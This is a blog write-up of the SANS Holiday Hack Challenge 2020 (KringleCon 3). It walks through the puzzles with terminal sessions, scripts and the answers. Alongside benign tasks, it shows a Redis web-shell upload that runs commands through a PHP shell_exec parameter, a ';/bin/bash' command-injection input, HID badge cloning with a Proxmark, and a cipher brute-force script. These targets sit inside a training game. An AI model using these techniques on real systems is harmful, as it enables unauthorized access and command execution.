---
layout: post
title:  Sans Holiday Hack Challenge Kringle Con3
categories: ctfs
tags: [sans, ctf]
published: true
author: j1v37u2k3y
show_sidebar: true
toc: true
searchable: true
---
This year, we welcome tens of thousands of participants from around the world to solve holiday-themed challenges and attend Santa's virtual conference.

KringleCon is moving to an exciting newly renovated location at the North Pole. This year, Santa and his team of hard-working elves embarked on the largest construction project ever seen at the North Pole - a big upgrade of Santa's castle. We've added a huge new courtyard, extra floors, and a magical elevator. Construction is almost done, just in time for KringleCon!

To get to the North Pole and all the festivities, first review our [Code of Conduct and Terms of Use](https://2020.kringlecon.com/invite?modal=tos), then sign in and hop onto the gondola for your ride up the mountain to Santa's castle.

<https://2020.kringlecon.com/invite>

<!--cut-->

# Objectives list

[![](/assets/images/sans/2020/c079826e.png)](/assets/images/sans/2020/c079826e.png)

[![](/assets/images/sans/2020/63c29cff.png)](/assets/images/sans/2020/63c29cff.png)

[![](/assets/images/sans/2020/6e24fa8c.png)](/assets/images/sans/2020/6e24fa8c.png)

## (Hacked) 1) Uncover Santa's Gift List

> There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.

[Check Santa's Billboard](#santas-billboard)

## (Hacked) 2) Investigate S3 Bucket

> When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.

[Check front lawn](#investigate-s3-bucket)

## (Hacked) 3) Point-of-Sale Password Recovery

> Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?

[Check the courtyard](#courtyard)

## (Hacked) 4) Operate the Santavator

> Talk to Pepper Minstix in the entryway to get some hints about the Santavator.

[Check The Santavator](#santavator-1)

## (Hacked) 5) Open HID Lock

> Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.

[Check the extra door](#extra-door)

## 6) Splunk Challenge

> Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?

[Check the Great Room](#great-room)

## 7) Solve the Sleigh's CAN-D-BUS Problem

> Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.

[Check Santa's Sleigh](#santass-sleigh)

## 8) Broken Tag Generator

> Help Noel Boetie fix the [Tag Generator](https://tag-generator.kringlecastle.com/) in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.

## 9) ARP Shenanigans

> Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at `/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`. Who recused herself from the vote described on the document?

## (Hacked) 10) Defeat Fingerprint Sensor

> Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint.

[Check The Santavator](#santavator-2)

## 11a) Naughty/Nice List with Blockchain Investigation Part 1

> Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and [tools](https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip). (Enter just the 16-character hex hash)

[Check the naughty nice list](#naughty-nice-list)

## 11b) Naughty/Nice List with Blockchain Investigation Part 2

> The SHA256 of Jack's altered block is: `58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f`. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block?

[Check the naughty nice list](#naughty-nice-list)

# Entrance

## Santa's Billboard

[![](/assets/images/sans/2020/b9bae065.png)](/assets/images/sans/2020/b9bae065.png)

- pulling the toggle level back and forth to read

### Message Revealed

`proxmark`

# Kringle Kiosk

[![](/assets/images/sans/2020/aac2cca9.png)](/assets/images/sans/2020/aac2cca9.png)

## Badge

[![](/assets/images/sans/2020/7080f7fc.png)](/assets/images/sans/2020/7080f7fc.png)

```text
;/bin/bash
```

```text
  ____________
< j1v37u2k3y >
 ------------
  \
   \   \_\_    _/_/
    \      \__/
           (oo)\_______
           (__)\       )\/\
               ||----w |
               ||     ||

   ___                                                      _    
  / __|   _  _     __      __      ___     ___     ___     | |   
  \__ \  | +| |   / _|    / _|    / -_)   (_-<    (_-<     |_|   
  |___/   \_,_|   \__|_   \__|_   \___|   /__/_   /__/_   _(_)_  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_| """ | 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-
```

## MAP

[![](/assets/images/sans/2020/893159a2.png)](/assets/images/sans/2020/893159a2.png)

## Directory

[![](/assets/images/sans/2020/3baca006.png)](/assets/images/sans/2020/3baca006.png)

## Code of conduct

[![](/assets/images/sans/2020/6aba0e2d.png)](/assets/images/sans/2020/6aba0e2d.png)

# Settings

## Narrative

[![](/assets/images/sans/2020/749b7a10.png)](/assets/images/sans/2020/749b7a10.png)

[![](/assets/images/sans/2020/531a5907.png)](/assets/images/sans/2020/531a5907.png)

## Items

![](/assets/images/sans/2020/f44d26ed.png)

![](/assets/images/sans/2020/ad93e275.png)

![](/assets/images/sans/2020/e2cf442c.png)

## Achievements

[![](/assets/images/sans/2020/42bd439c.png)](/assets/images/sans/2020/42bd439c.png)

# 1F

## Front Lawn

### Investigate S3 Bucket

[![](/assets/images/sans/2020/899ea477.png)](/assets/images/sans/2020/899ea477.png)

- add wrapper3000 to the wordlist

[![](/assets/images/sans/2020/3469ac66.png)](/assets/images/sans/2020/3469ac66.png)

[![](/assets/images/sans/2020/f5a25d90.png)](/assets/images/sans/2020/f5a25d90.png)

```
cat package | base64 -d > packagestep2
unzip packagestep2
bunzip2 package.txt.Z.xz.xxd.tar.bz2
tar xvf package.txt.Z.xz.xxd.tar
xxd -r package.txt.Z.xz.xxd package.txt.Z.xz
xz --decompress package.txt.Z.xz
uncompress package.txt.Z
cat package.txt
```

#### Message Revealed

`North Pole: The Frostiest Place on Earth`

### Unescape Tmux

`tmux attach`

## Entry Way

### santa_portrait.jpg

Letters found

- If you look really closely on the image there is a series of letters exposed

[![](/assets/images/sans/2020/1c98b5ee.png)](/assets/images/sans/2020/1c98b5ee.png)

- `NOW I SHALL OB EUT OF HSIGT`
- `NOW I SHALL BE OUT OF SIGHT`

<https://www.bartleby.com/360/1/112.html>

> THE FROST looked forth, one still, clear night, And he said, *__Now I shall be out of sight__*;
So through the valley and over the height
In silence I ’ll take my way.
I will not go like that blustering train,	        5
The wind and the snow, the hail and the rain,
Who make so much bustle and noise in vain,
But I ’ll be as busy as they!”

### Santavator 1

[![](/assets/images/sans/2020/eb1bbac5.png)](/assets/images/sans/2020/eb1bbac5.png)

[![](/assets/images/sans/2020/15d12678.png)](/assets/images/sans/2020/15d12678.png)

[![](/assets/images/sans/2020/1aa512e0.png)](/assets/images/sans/2020/1aa512e0.png)

> Opens all floors but need scan fingerprint to access santas office

[![](/assets/images/sans/2020/0db3aaff.png)](/assets/images/sans/2020/0db3aaff.png)

### Santavator 2

#### Hacking the fingerprint sensor

- Before

[![](/assets/images/sans/2020/31c7a400.png)](/assets/images/sans/2020/31c7a400.png)

- After

[![](/assets/images/sans/2020/95dcdcfd.png)](/assets/images/sans/2020/95dcdcfd.png)


## Dining Room

### The Elf Code

#### Level 1

```javascript
elf.moveTo(lollipop[0])
elf.moveUp(20)
```
#### Level 2 - Trigger The Yeeter

- Info:
> Move to the lever, elf.get_lever(0), and manipulate the resulting data however it asks, and send the answer to elf.pull_lever(answer). The yeeter should release, and you can move freely.
> Click on the object help and current level object icons for examples on how to complete this task.

```javascript
var sum = elf.get_lever(0) + 2
elf.moveTo(lever[0])
elf.pull_lever(sum)
elf.moveLeft(4)
elf.moveUp(10)
```

#### Level 3 - Move To Loopiness

- Note
> Pick up all of the lollipops!

```javascript
for (i = 0; i < 3; i++) {
  elf.moveTo(lollipop[i])
}
elf.moveUp(1)
```

#### Level 4 - Up Down Loopiness

- Note
> Using another for loop could reduce how many elf function statements are used.
- Hint
> Using elf.moveLeft(40) will move your elf as far as possible before hitting an obstacle or the end of the screen. Use however high a number you think you need!

```javascript
for (i = 0; i < 10; i++) {
  elf.moveLeft(3)
  elf.moveUp(20)
  elf.moveLeft(3)
  elf.moveDown(20)
}
``` 

#### Level 5 - Move To Madness

- Hint
> Experiment with the elf.moveTo() function. You might be able to get two-in-one if you move to munchkin[0].
> Click on the munchkin in the CURRENT LEVEL OBJECTS window to see the kind of answer the munchkin is looking for in this challenge.

```javascript
var nums = elf.ask_munch(0)
var filtered = nums.filter(function(item) {
    return (parseInt(item) == item);
});
elf.moveTo(munchkin[0])
elf.tell_munch(filtered)
elf.moveUp(3)
``` 

#### Level 6 - Two Paths, Your Choice

- Note
> There are two paths here for you to choose. Choosing the lever may take more steps but might be easier to solve.

```javascript
var json = elf.ask_munch(0)
var found = false;
for (x in json) {
  if (json[x] == 'lollipop') {
    found = x
  }
}
for (i = 0; i < 4; i++) {
  elf.moveTo(lollipop[i])
}
elf.moveTo(munchkin[0])
elf.tell_munch(found)
elf.moveUp(3)
```


#### Level 7 - Yeeter Swirl

 - About
> Follow the swirl being careful not to step on any traps (or get yeeted off the map).

 - Note
> elf.moveTo(object) has been disabled for this challenge.

 - Hint 
> Use loops and an incrementing count to take the exact number of steps.

```javascript

``` 

## Kitchen

### Redis Bug Hunt (Holly Evergreen)

<https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce>

[![](/assets/images/sans/2020/e43d9758.png)](/assets/images/sans/2020/e43d9758.png)

```text
player@ae1b7d72cb1a:~$  redis-cli --raw -a 'R3disp@ss'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> config set dir /var/www/html/
OK
127.0.0.1:6379> config set dbfilename redis.php
OK
127.0.0.1:6379> set test "<?php echo shell_exec($_GET['jiveturkey']); ?>"
OK
127.0.0.1:6379> save
OK
127.0.0.1:6379> exit
```

[![](/assets/images/sans/2020/40fd33d7.png)](/assets/images/sans/2020/40fd33d7.png)

```text
curl localhost/redis.php?jiveturkey=cat+index.php --output thefile.php
strings thefile.php
```

[![](/assets/images/sans/2020/32357dca.png)](/assets/images/sans/2020/32357dca.png)

### 33.6 kbps (Fitzy Shortstack)

[![](/assets/images/sans/2020/3f060137.png)](/assets/images/sans/2020/3f060137.png)

[![](/assets/images/sans/2020/711ba5cb.png)](/assets/images/sans/2020/711ba5cb.png)

> Note: gotta be speedy entering buttons

- 756-8347
- baa dee brr
- aaah
- wewewwrwrrwrr
- beDURRdunditty
- SCHHRRHHRTHRTR

[![](/assets/images/sans/2020/05511be2.png)](/assets/images/sans/2020/05511be2.png)


## Courtyard

### Santa Shop (Sugerplum Mary)

[![](/assets/images/sans/2020/2b99d9aa.png)](/assets/images/sans/2020/2b99d9aa.png)

> It's an electron application

[![](/assets/images/sans/2020/de659700.png)](/assets/images/sans/2020/de659700.png)

#### Use ASAR NPM package to extract the package

1. First we need to install the .exe
2. Then find the file path where it is located
  - [![](/assets/images/sans/2020/6deb43af.png)](/assets/images/sans/2020/6deb43af.png)
3. Then extract the asar file to inspect the code:
  - `npm install --engine-strict asar -global`
  - `asar extract app.asar extracted/`
  - [![](/assets/images/sans/2020/1cce7c95.png)](/assets/images/sans/2020/1cce7c95.png)
4. Extracted Code
  - [![](/assets/images/sans/2020/df9a51cc.png)](/assets/images/sans/2020/df9a51cc.png)
5. Find santas password in app
  - [![](/assets/images/sans/2020/4911f81d.png)](/assets/images/sans/2020/4911f81d.png)
  - `santapass`

### Linux Primer

[![](/assets/images/sans/2020/12553606.png)](/assets/images/sans/2020/12553606.png)

[![](/assets/images/sans/2020/571f3f44.png)](/assets/images/sans/2020/571f3f44.png)

[![](/assets/images/sans/2020/844f3284.png)](/assets/images/sans/2020/844f3284.png)

```bash
elf@758a05e1d458:~$ ls -al
total 60
drwxr-xr-x 1 elf  elf   4096 Dec 10 18:18 .
drwxr-xr-x 1 root root  4096 Dec 10 18:14 ..
-rw-r--r-- 1 elf  elf     31 Dec 10 18:18 .bash_history
-rw-r--r-- 1 elf  elf    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elf  elf   3105 Dec  5 00:00 .bashrc
-rw-r--r-- 1 elf  elf    807 Apr  4  2018 .profile
-rw-r--r-- 1 elf  elf    168 Dec  5 00:00 HELP
-rw-r--r-- 1 elf  elf     27 Dec 10 18:18 munchkin_19315479765589239
drwxr-xr-x 1 elf  elf  20480 Dec 10 18:19 workshop
elf@758a05e1d458:~$ cat munchkin_19315479765589239 | grep munchkin
munchkin_24187022596776786
elf@758a05e1d458:~$ rm munchkin_19315479765589239 
elf@758a05e1d458:~$ pwd
/home/elf
elf@758a05e1d458:~$ ls -al | grep munchkin
-rw-r--r-- 1 elf  elf      0 Dec 11 03:15 .munchkin_5074624024543078
elf@758a05e1d458:~$ history | grep munchkin
    1  echo munchkin_9394554126440791
    3  cat munchkin_19315479765589239 | grep munchkin
    4  rm munchkin_19315479765589239 
    6  ls -al | grep munchkin
    7  history | grep munchkin
elf@758a05e1d458:~$ env | grep munchkin
z_MUNCHKIN=munchkin_20249649541603754
elf@758a05e1d458:~$ cd workshop/
elf@758a05e1d458:~/workshop$ grep -i munchkin toolbox_*
toolbox_191.txt:mUnChKin.4056180441832623
elf@758a05e1d458:~/workshop$ chmod +x lollipop_engine 
elf@758a05e1d458:~/workshop$ ./lollipop_engine 
munchkin.898906189498077
elf@758a05e1d458:~/workshop$ cd electrical/
elf@758a05e1d458:~/workshop/electrical$ ls -al
total 16
drwxr-xr-x 1 elf elf 4096 Dec 10 18:19 .
drwxr-xr-x 1 elf elf 4096 Dec 10 18:19 ..
-rw-r--r-- 1 elf elf  200 Dec 10 18:19 blown_fuse0
elf@758a05e1d458:~/workshop/electrical$ mv blown_fuse0 fuse0
elf@758a05e1d458:~/workshop/electrical$ 
elf@758a05e1d458:~/workshop/electrical$ ln -s /home/elf/workshop/electrical/fuse0 /home/elf/workshop/electrical/fuse1
elf@758a05e1d458:~/workshop/electrical$ cp fuse1 fuse2
elf@758a05e1d458:~/workshop/electrical$ echo "MUNCHKIN_REPELLENT" >> fuse2
elf@758a05e1d458:~/workshop/electrical$ find /opt/munchkin_den/ -iname munchkin
elf@758a05e1d458:~/workshop/electrical$ find /opt/munchkin_den/ -iname *munchkin*
/opt/munchkin_den/
/opt/munchkin_den/apps/showcase/src/main/resources/mUnChKin.6253159819943018
elf@758a05e1d458:~/workshop/electrical$ find /opt/munchkin_den/ -user munchkin
/opt/munchkin_den/apps/showcase/src/main/resources/template/ajaxErrorContainers/niKhCnUm_9528909612014411
elf@758a05e1d458:~/workshop/electrical$ find /opt/munchkin_den/ -type f -size +108k -size -110k
/opt/munchkin_den/plugins/portlet-mocks/src/test/java/org/apache/m_u_n_c_h_k_i_n_2579728047101724
elf@758a05e1d458:~/workshop/electrical$ ps aux | grep munchkin
elf      15408  1.7  0.0  84316 25912 pts/2    S+   03:24   0:00 /usr/bin/python3 /14516_munchkin
elf      15781  0.0  0.0  13240  1056 pts/3    S+   03:24   0:00 grep --color=auto munchkin
elf@758a05e1d458:~/workshop/electrical$ netstat -tunelp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 0.0.0.0:54321           0.0.0.0:*               LISTEN      1051       35735995   15408/python3
elf@758a05e1d458:~/workshop/electrical$ curl localhost:54321
munchkin.73180338045875elf@758a05e1d458:~/workshop/electrical$ kill 15408
elf@758a05e1d458:~/workshop/electrical$
```

## Great Room

### Angel CandySalt

- Splunk Server
  > "The Splunk terminal is for Santa and select SOC elves only."
  
Im Santa:
<https://splunk.kringlecastle.com/en-US/app/SA-kringleconsoc/kringleconsoc>

[![](/assets/images/sans/2020/b47222e0.png)](/assets/images/sans/2020/b47222e0.png)

#### Challenge Question

> What is the name of the adversary group that Santa feared would attack KringleCon?

#### Training question 1

> How many distinct MITRE ATT&CK techniques did Alice emulate?

```text
| tstats count where index=* by index 
| search index=T*-win OR T*-main
| rex field=index "(?<technique>t\d+)[\.\-].0*" 
| stats dc(technique)
```

- 13

[![](/assets/images/sans/2020/77f7cfc6.png)](/assets/images/sans/2020/77f7cfc6.png)

#### Training Question 2

> What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space)

```text

```

# 1.5F

## Workshop
### Sort-o-matic (Minty Candycane)

[![](/assets/images/sans/2020/f6450f24.png)](/assets/images/sans/2020/f6450f24.png)

1. Matches at least one digit
- `\d`
2. Matches 3 alpha a-z characters ignoring case
- `[A-Za-z]{3}`
3. Matches 2 chars of lowercase a-z or numbers
- `[a-z0-9]{2}`
4. Matches any 2 chars not uppercase A-L or 1-5
- `[^A-L1-5]{2}`
5. Matches three or more digits only
- `^[0-9]{3,}$`
6. Matches multiple hour:minute:second time formats only
- `^([0-5]\d):([0-5]\d):([0-5]\d)$`
7. Matches MAC address format only while ignoring case
- `^([0-9a-fA-F][0-9a-fA-F]:){5}([0-9a-fA-F][0-9a-fA-F])$`
8. Matches multiple day, month, and year date formats only
- `([0-9]{2})[-/.](([0-3][0-1])|([0-2][0-9]))[-/.]([0-9]{4})`
- `(\d{2})[-/.](([0-3][0-1])|([0-2]\d))[-/.](\d{4})`
- day month year
  - `^(0[1-9]|[12][0-9]|3[01])[\-\/\.](0[1-9]|1[012])[\-\/\.](19|20)\d\d$`

[![](/assets/images/sans/2020/a2114dad.png)](/assets/images/sans/2020/a2114dad.png)

### Extra Door

[![](/assets/images/sans/2020/6a71810a.png)](/assets/images/sans/2020/6a71810a.png)


#### Proxmark3 CLI

[![](/assets/images/sans/2020/bb7fce06.png)](/assets/images/sans/2020/bb7fce06.png)

<https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/>

<https://github.com/rfidresearchgroup/proxmark3/>

[![](/assets/images/sans/2020/a08ee0d7.png)](/assets/images/sans/2020/a08ee0d7.png)

##### HID Prox

<https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/cheatsheet.md#HID-Prox>

[![](/assets/images/sans/2020/2c1a15db.png)](/assets/images/sans/2020/2c1a15db.png)

Noel Boetie - `#db# TAG ID: 2006e22f08 (6020) - Format Len: 26 bit - FC: 113 - Card: 6020`

Wrapping room - `#db# TAG ID: 2006e22ee1 (6000) - Format Len: 26 bit - FC: 113 - Card: 6000`

Sparkle Redberry - `#db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022`

Holly Evergreen - `#db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024`

Bow Ninecandle - `#db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023`

Shinny Upatree - `#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025`

```text
lf hid sim -r 2006e22f0e
```
[![](/assets/images/sans/2020/3dd349e9.png)](/assets/images/sans/2020/3dd349e9.png)

## Wrapping Room (Noel Boetie)

- Tag Generator
>The Tag Generator is for Santa and select wrapping engineer elves only.

# 2F

## Greeting Cards (Chimney Scissorticks)

<https://greeting-cards.kringlecastle.com/>

[![](/assets/images/sans/2020/34d38340.png)](/assets/images/sans/2020/34d38340.png)

[![](/assets/images/sans/2020/495e15bd.png)](/assets/images/sans/2020/495e15bd.png)

## Talks Lobby

[![](/assets/images/sans/2020/f41ff735.png)](/assets/images/sans/2020/f41ff735.png)

## Speaker UNPrep (Bushy Evergreen)

### ./door
[![](/assets/images/sans/2020/0199908c.png)](/assets/images/sans/2020/0199908c.png)

[![](/assets/images/sans/2020/b078ec1b.png)](/assets/images/sans/2020/b078ec1b.png)

- password
> `Op3nTheD00r`

[![](/assets/images/sans/2020/a2797f69.png)](/assets/images/sans/2020/a2797f69.png)

### ./lights

[![](/assets/images/sans/2020/46bea9f4.png)](/assets/images/sans/2020/46bea9f4.png)

- hashed password
> `E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124`

### ./vending-machines

[![](/assets/images/sans/2020/6eadc3b2.png)](/assets/images/sans/2020/6eadc3b2.png)

- password
> `LVEdQPpBwr`

[![](/assets/images/sans/2020/6cc2a158.png)](/assets/images/sans/2020/6cc2a158.png)

[![](/assets/images/sans/2020/0cc28cc4.png)](/assets/images/sans/2020/0cc28cc4.png)


- Whole alphabet
  - `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890` equals
  - `Xqn93CvVzA4xBJU8m2CTk3S0rtbB6wuxknsk0sQBRzXyWgNATD5K55tKdOtFEZ`

- A
  - `AAAAAAAAAAAAAAAAAAAAAAAA` equals
  - `XiGRehmwXiGRehmwXiGRehmw`

- B
  - `BBBBBBBB`
  - `DqTpKv7f`

- C
  - `CCCCCCCCCCCCCCCCCCCCCCCCCC`
  - `Lbn3UP9WLbn3UP9WLbn3UP9WLb`
  
So with this knowledge we can write a script to crack the code

#### Hacked

```python
import os
import string

printableStrings=string.printable

fileName='letters.txt'

os.system('rm ' + fileName)

# loop
for x in printableStrings:
  os.system('rm vending-machines.json')
  os.system('echo "elf\r\n" "' + x* 8 + '\r\n" | ./vending-machines')
  os.system('cat vending-machines.json')
  os.system('echo '+x+':`cat vending-machines.json | grep password | cut -d "\\"" -f 4` >>' + fileName)


file1 = open(fileName, 'r')
Lines = file1.readlines()

count = 0
lettersArray =[]
# Strips the newline character
for line in Lines:
    #print("Line{}: {}".format(count, line.strip()))
    lettersArray.append(line.strip().split(":"))

print(lettersArray)

decodeIt = "LVEdQPpBwr"

myIter = 0
for letterToFind in decodeIt:
    #print("finding first letter: " + letterToFind)
    for arr in lettersArray:
        #print(arr[0])
        pass
        if len(arr) > 1:
            if arr[1][myIter] == letterToFind:
                print(str(arr[0]))
                #print(arr[1][myIter])
                break
    myIter = myIter + 1
    if myIter == 8:
        myIter = 0

```

[![](/assets/images/sans/2020/eb7af6b0.png)](/assets/images/sans/2020/eb7af6b0.png)

##### Password 

`CandyCane1`

[![](/assets/images/sans/2020/527c22cf.png)](/assets/images/sans/2020/527c22cf.png)

### Snowball Fight (Tangle Coalbox)

<https://snowball2.kringlecastle.com/game>

[![](/assets/images/sans/2020/79d73afd.png)](/assets/images/sans/2020/79d73afd.png)

- Enter below into console (Easy, Medium, Hard, Impossible)

```javascript
for(i=0;i<10;i++){
    for(j=0;j<10;j++){
        console.log(i, j);
        ws.send('{"Type":"SplashOut"}');
        ws.send('{"Type":"FireForEffect","Verify":"1","Cell":['+i+','+j+']}');
    }
}
```
[![](/assets/images/sans/2020/49b65414.png)](/assets/images/sans/2020/49b65414.png)


<https://snowball2.kringlecastle.com/win?winCode=30573784897911eaa185afa0a3ac6ca2&id=HughRansomDrysdale>

# 3F

## Balcony

## Santa's Office

- traced javascript to bypass finger print sensor

[Check Santavator 2](#santavator-2)

### Naughty nice list

Santa's Naughty/Nice List is for Santa and Elf Ethicists only.



# ROOF

## Netwars Room

### Scapy Prepper (Alabaster Snowball)

[![](/assets/images/sans/2020/30b9612e.png)](/assets/images/sans/2020/30b9612e.png)

[![](/assets/images/sans/2020/050991b9.png)](/assets/images/sans/2020/050991b9.png)

[![](/assets/images/sans/2020/8e7a5445.png)](/assets/images/sans/2020/8e7a5445.png)

<https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html>

<https://scapy.readthedocs.io/en/latest/api/scapy.utils.html>

1. Welcome to the "Present Packet Prepper" interface! The North Pole could use your help preparing present packets for shipment.
Start by running the task.submit() function passing in a string argument of 'start'.
Type task.help() for help on this question.
```
task.submit('start')
```

2. Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.
```
task.submit(send)
```

3. Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.
```
task.submit(sniff)
```

4. Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named "pkt":
    1. pkt = sr1(IP(dst="127.0.0.1")/TCP(dport=20))
    2. pkt = sniff(IP(dst="127.0.0.1")/TCP(dport=20))
    3. pkt = sendp(IP(dst="127.0.0.1")/TCP(dport=20))
    - Look for "Send packets at layer 3 and return only the first answer" at the link ( https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html )
  
    ```
    task.submit(1)
    ```

5. Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets.
```
task.submit(rdpcap)
```

6. The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS:
    1. UDP_PACKETS.print()
    2. UDP_PACKETS.show()
    3. UDP_PACKETS.list()
    
    ```
    task.submit(2)
    ```

7. Correct! .show() can be used on lists of packets AND on an individual packet.

    Submit only the first packet found in UDP_PACKETS.
    
    [![](/assets/images/sans/2020/38f3330b.png)](/assets/images/sans/2020/38f3330b.png)
    
    ```text
    0000 Ether / IP / UDP / DNS Qry "b'www.elves.rule.'" 
    0001 Ether / IP / UDP / DNS Ans "10.21.23.12" 
    ```
    
    ```
    
    ```


### CAN-Bus Investigation (Wunorse Openslae)

[![](/assets/images/sans/2020/81c4fbaf.png)](/assets/images/sans/2020/81c4fbaf.png)

- candump.log

```shell
elf@d4a05d53a573:~$ cat candump.log | wc -l
1369
i=1; while read line; do i=$((i+1)); echo $i/1369; num=$(echo $line | cut -d ')' -f1 | cut -d '.' -f2); echo $num | ./runtoanswer >> logdata.txt; done < candump.log
```

```shell
elf@d4a05d53a573:~$ cat logdata.txt | grep "Your answer is correct"
Your answer is correct!
elf@d4a05d53a573:~$ cat logdata.txt | grep -B 4 "Your answer is correct"
(e.g., if the timestamp of the UNLOCK were 1608926672.391456, you would enter 391456.
> Your answer: 122520

Checking....
Your answer is correct!
```

### ARP Shenanigans

[![](/assets/images/sans/2020/c43aefbc.png)](/assets/images/sans/2020/c43aefbc.png)

### Santas's sleigh

- Only Santa and official Sled Technician Elves are allowed access to Santa's Sled.

<https://candbus.kringlecastle.com/>

> HINT:
>
> CAN ID Codes
>
> From: Wunorse Openslae
>
> Objective: 7) Solve the Sleigh's CAN-D-BUS Problem
>
> Try filtering out one CAN-ID at a time and create a table of what each might pertain to. What's up with the brakes and doors?

[![](/assets/images/sans/2020/ddbcc20d.png)](/assets/images/sans/2020/ddbcc20d.png)

- js console (reduce the noise a bit):

```javascript
ws.send('{"Type":"FilterAdd","Filter":["019","Equals","000000000000"]}')
ws.send('{"Type":"FilterAdd","Filter":["080","Equals","000000000000"]}')
ws.send('{"Type":"FilterAdd","Filter":["244","Equals","000000000000"]}')
ws.send('{"Type":"FilterAdd","Filter":["188","Equals","000000000000"]}')
```

message that is still around: `{"Type":"CAN-D-bus","Message":"19B#0000000F2057"}`

```javascript
ws.send('{"Type":"FilterAdd","Filter":["19B","Equals","0000000F2057"]}')
```

- Brakes:

```text
{"Type":"Controls","ABSSS":[0, 48, 0, 0, 0, 0, 0 ]}	51	
17:03:19.210
{"Type":"System","Status":"ABSSS Good"}	39	
17:03:19.243
{"Type":"CAN-D-bus","Message":"080#000030"}	43	
17:03:19.564
{"Type":"CAN-D-bus","Message":"080#FFFFFD"}	43	
17:03:19.665
{"Type":"CAN-D-bus","Message":"080#000030"}	43	
17:03:20.070
{"Type":"CAN-D-bus","Message":"080#FFFFF3"}	43	
17:03:20.171
{"Type":"CAN-D-bus","Message":"080#000030"}	43	
17:03:20.577
{"Type":"CAN-D-bus","Message":"080#FFFFF0"}	43	
17:03:20.678
{"Type":"CAN-D-bus","Message":"080#000030"}	43	
17:03:21.083
{"Type":"CAN-D-bus","Message":"080#FFFFFA"}	43	
17:03:21.183
{"Type":"CAN-D-bus","Message":"080#000030"}	43	
17:03:21.589
{"Type":"CAN-D-bus","Message":"080#FFFFF8"}	43	
17:03:21.690
{"Type":"CAN-D-bus","Message":"080#000030"}	43	
17:03:22.195
{"Type":"CAN-D-bus","Message":"080#FFFFFD"}	43	
17:03:22.296
{"Type":"CAN-D-bus","Message":"080#000030"}	43	
17:03:22.701
{"Type":"CAN-D-bus","Message":"080#FFFFF8"}	43	
17:03:22.802
{"Type":"CAN-D-bus","Message":"080#000030"}	43	
17:03:23.206
{"Type":"CAN-D-bus","Message":"080#FFFFFD"}	43	
17:03:23.308
{"Type":"CAN-D-bus","Message":"080#000030"}	43	
17:03:23.712
{"Type":"CAN-D-bus","Message":"080#FFFFF3"}	43	
17:03:23.814
{"Type":"Controls","ABSSS":[0, 0, 0, 0, 0, 0, 0 ]}	50	
17:03:24.179
{"Type":"System","Status":"ABSSS Good"}	39	
17:03:24.211
{"Type":"CAN-D-bus","Message":"080#000030"}	43	
17:03:24.217
{"Type":"CAN-D-bus","Message":"080#FFFFFA"}	43	
17:03:24.318

```

- Lock and unlock:

```text
{"Type":"Controls","ABSSS":[0, 0, 0, 0, 0, 1, 0 ]}	50	
17:04:39.079
{"Type":"CAN-D-bus","Message":"19B#000000000000"}	49	
17:04:39.112
{"Type":"System","Status":"ABSSS Good"}	39	
17:04:39.214
{"Type":"Controls","ABSSS":[0, 0, 0, 0, 0, 0, 1 ]}	50	
17:04:46.249
{"Type":"CAN-D-bus","Message":"19B#00000F000000"}	49	
17:04:46.282
{"Type":"System","Status":"ABSSS Good"}	39	
17:04:46.384
```
